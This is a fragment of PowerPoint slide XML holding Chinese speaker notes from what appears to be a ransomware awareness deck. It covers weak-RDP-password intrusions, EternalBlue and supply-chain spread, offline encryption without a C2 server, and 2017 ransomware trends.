              <a:t>180</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38446271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a:t>经过检测，初步断定黑客通过服务器的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>3389</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>弱口令进入操作系统，并上传其加密程序，执行了全盘加密；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3686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CE6BD293-420D-4CC6-B1BB-50A6E326AFF9}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>183</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19878958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8"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993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44EE7C77-7BEA-4B72-8EC8-BE14F6A56F76}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>185</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6282202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a:t>在与现场运维人员沟通后，发现该数据库服务器系统用户存在弱口令的现象，因此，推测攻击者先通过弱口令探测的方式，使用远程桌面登录到数据库服务器，最终上传并执行勒索软件，对服务器文件进行加密；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4403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04ADFAD5-0B63-4CD6-A068-D5C911E62170}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>187</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28690971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0"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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>一）服务器入侵传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>黑客先通过弱口令、系统或软件漏洞等方式获取用户名和密码，再通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RDP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>（远程桌面协议）远程登录服务器，一旦登录成功，黑客就可以在服务器上为所欲为，例如，卸载服务器上的安全软件并手动运行勒索软件。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>这种攻击方式，一旦服务器被入侵，安全软件一般是不起作用的。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>管理员账号密码被破解，是服务器被入侵的主要原因。其中，管理员使用弱密码被黑客暴力破解，部分黑客利用病毒或木马潜伏用户电脑盗取密码，黑客还可从其他渠道直接购买账号密码（这里就涉及到敏感数据泄露问题了。）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>（二）利用漏洞自动传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通过系统自身漏洞进行传播扩散，是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>年的一个新特点。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WannaCry</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>勒索病毒就是利用永恒之蓝（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>EternalBlue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）漏洞进行传播。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>此类勒索软件在破坏功能上与传统勒索软件无异，都是加密用户文件勒索赎金，但因传播方式不同，更难以防范，需要用户提高安全意识，及时更新有漏洞的软件或安装对应的安全补丁。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>（三） 软件供应链攻击传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>软件供应链攻击是指利用软件供应商与最终用户之间的信任关系，在合法软件正常传播和升级过程中，利用软件供应商的各种疏忽或漏洞，对合法软件进行劫持或篡改，从而绕过传统安全产品检查达到非法目的的攻击类型。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>年爆发的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Fireball</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、暗云</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>III</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、类</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Petya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、异鬼</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Kuzzle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>XShellGhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>CCleaner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等后门事件均属于软件供应链攻击。而在乌克兰爆发的类</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Petya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>勒索软件事件也是其中之一，该病毒通过税务软件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>M.E.Doc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的升级包投递到内网中进行传播。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>（四） 邮件附件传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通过伪装成产品订单详情或图纸等重要文档类的钓鱼邮件，在附件中夹带含有恶意代码的脚本文件，一旦用户打开邮件附件，便会执行里面的脚本，释放勒索病毒。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>这类传播方式针对性较强，主要瞄准公司企业、各类单位和院校，电脑中往往不是个人文档而是公司文档。最终目的是给公司业务的运转制造破坏，迫使公司为了止损而不得不交付赎金。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>（五） 利用挂马网页传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通过入侵主流网站的服务器，在正常网页中植入木马，让访问者在浏览网页时利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>IE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>或</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Flash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等软件漏洞进行攻击。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>这类勒索软件属于撒网抓鱼式的传播，没有特定的针对性，中招的受害者多数为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>裸奔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>用户，未安装任何杀毒软件。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>使用了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>MS17-010</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>远程高危漏洞进行自我传播复制</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>敲诈者通过文件加密方面的编程较为规范，流程符合密码学标准（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RSA+AES</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>加密），很难通过其他手段对勒索文件进行解密。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4813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82E72658-46DD-4FA7-9DC7-337D1EA34C73}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>189</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3471009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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>一</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>无</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>C2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务器加密技术流行</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年，我们发现黑客在对文件加密的过程中，一般不再使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>C2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务器了，也就是说现在的勒索软件加密过程中不需要回传私钥了。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>这种技术的加密过程大致如下：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>）在加密前随机生成新的加密密钥对（非对称公、私钥）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>）使用该新生成新的公钥对文件进行加密</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>）把新生成的私钥采用黑客预埋的公钥进行加密保存在一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文件或嵌入在加密文件里</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>解密过程大致如下：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>）通过邮件或在线提交的方式，提交</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>串或加密文件里的加密私钥（该私钥一般黑客会提供工具提取）；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>）黑客使用保留的预埋公钥对应的私钥解密受害者提交过来的私钥；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>）把解密私钥或解密工具交付给受害者进行解密。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>通过以上过程可以实现每个受害者的解密私钥都不相同，同时可以避免联网回传私钥。这也就意味着不需要联网，勒索病毒也可以对终端完成加密，甚至是在隔离网环境下，依然可以对文件和数据进行加密。显然 ，这种技术是针对采用了各种隔离措施的政企机构所设计的。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>二</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>攻击目标转向政企机构</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年，勒索软件的攻击进一步聚焦在高利润目标上，其中包括高净值个人、连接设备和企业服务器。特别是针对中小企业网络服务器的攻击急剧增长，已经成为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年勒索软件攻击的一大鲜明特征。据不完全统计，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年，约</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>15%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>的勒索软件攻击是针对中小企业服务器发起的定向攻击，尤以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Crysis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>xtbl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>wallet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>arena</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Cobra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>等家族为代表。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>客观的说，中小企业往往安全架构单一，相对容易被攻破。同时，勒索软件以企业服务器为攻击目标，往往也更容易获得高额赎金。例如：针对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务器的勒索软件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Rrebus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>，虽然名气不大，却轻松从韩国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>托管公司</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Nayana</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>收取了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>100</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>万美元赎金，是震惊全球的永恒之蓝全部收入的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>倍之多。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Nayana</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>所以屈服，是因为超</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>150</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>台服务器受到攻击，上面托管着</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>3400</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>多家中小企业客户的站点。这款勒索病毒的覆盖面有限，韩国几乎是唯一的重灾区。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>三</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>针对关键信息基础设施的攻击</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>WannaCry</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>、类</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Petya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>为代表的勒索软件，则是将关键信息基础设施作为了主要攻击目标，这在以往是从未出现过的严峻情况。关键基础设施为社会生产和居民生活提供公共服务，保证国家或地区社会经济活动正常进行，其一旦被攻击将严重影响人们的日常生活，危害巨大。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>四</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>攻击目的开始多样化</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>顾名思义，勒索软件自然就是要勒索钱财。但这种传统认知已经在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年被打破。以网络破坏、组织破坏为目的的勒索软件已经出现并开始流行。其中最为典型的代表就是类</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Petya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>。与大多数勒索软件攻击不同，类</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Petya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>的代码不是为了向受害者勒索金钱，而是要摧毁一切。类</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Petya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>病毒的主要攻击目的就是为了破坏数据而不是获得金钱。此外，以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Spora</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>为代表的窃密型勒索软件在加密用户文档时，还会窃取用户账号密码和键盘输入等信息，属于功能复合型勒索软件。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>这些不仅以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>勒索</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>为目的的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>勒索软件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>，实际上只是结合了传统勒索软件对文件进行加密的技术方法来实现其数据破坏、信息窃取等其他攻击目的。相比于勒索金钱，这种攻击将给对手带来更大的破坏和更大的威胁。这不仅会引发网络犯罪</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>商业模式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>的新变种，而且会反过来刺激网络保险市场的进一步扩张。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>五</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>勒索软件平台化运营</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年，勒索软件已经不再是黑客单打独斗的产物，而是做成平台化的上市服务，形成了一个完整的产业链条。在勒索软件服务平台上，勒索软件的核心技术已经直接打包封装好了，小黑客直接购买调用其服务，即可得到一个完整的勒索软件。这种勒索软件的生成模式我们称其为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>RaaS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务，而黑市中一般用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“Satan Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>（撒旦勒索软件）</a:t>
            </a:r>
            <a:r>
